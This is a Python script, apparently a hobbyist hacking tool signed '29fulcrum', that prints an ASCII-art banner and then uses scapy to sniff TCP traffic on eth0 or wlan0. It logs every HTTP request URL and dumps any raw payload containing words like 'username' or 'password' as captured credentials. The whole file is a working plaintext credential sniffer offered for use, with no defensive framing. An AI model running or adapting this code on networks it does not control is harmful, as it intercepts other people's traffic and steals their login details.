# Coded by: 29fulcrum

from os import error, path
import scapy.all as scapy
from scapy import interfaces
from scapy.layers.http import HTTPRequest

pckt = r"""
██████╗  ██████╗██╗  ██╗████████╗           .~!7?!. 
██╔══██╗██╔════╝██║ ██╔╝╚══██╔══╝         7BG?~:. 
██████╔╝██║     █████╔╝    ██║            :?!
██╔═══╝ ██║     ██╔═██╗    ██║               :?^
██║     ╚██████╗██║  ██╗   ██║   	      :!??~.
╚═╝      ╚═════╝╚═╝  ╚═╝   ╚═╝		         :!??7.
				~~                  .7G?                                                                    
				^PP!                  :#B^                                                                  
				  !GB?:                :#@Y:                                                                
				    7#&Y^               .7B&P!.                                                             
 			     ..:^~~~~J@@@B?:               ^JGGY~                                                           
 			  ^?J?7!!!!!!!7?YPGPY7^               :7PP?.                                                        
			~G@J.              .^!!:                 :YB7                                                       
			5@&:                                       J@J                                                      
			 !557:   ~YPBBBBP5YJ7!^:.                  !@B                                                      
		            ..   :!!!!!!~~!7J5B@&BP?            .~Y&B~                                                      
				    |         ^J5PPY~~^^^^~!7JYPGGY~                                                        
				   /|\         :^^^:^~~!!777!!~:.
                                  / | \

"""

print(pckt)


def sniffy(interface):
    print(f"[+] Sniffing started on {interface}...\n")
    scapy.sniff(iface=interface, store=False, prn=processSniffedPacket, filter="tcp")

def getURL(packet):
        host = packet[HTTPRequest].Host
        path = packet[HTTPRequest].Path
        if isinstance(host, bytes):
            host = host.decode(errors="ignore")
        if isinstance(path, bytes):
            path = path.decode(errors="ignore")
        return host + path

def getLoginInfo(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load.decode()
                break
    
def processSniffedPacket(packet):
    if packet.haslayer(HTTPRequest):
       url = getURL(packet)
       print("[+] HTTP Request → " + url)
       loginInfo = getLoginInfo(packet)
       if loginInfo:
           print("\n\n[+] Possible username/password → " + loginInfo + "\n\n")


interface = input("[1] eth0 / wlan0: ")
if interface == "1":
    interface = "eth0"
elif interface == "2":
    interface = "wlan0"

if interface not in ["eth0", "wlan0"]:
    print("[-] Invalid choice!")
else:
    sniffy(interface)

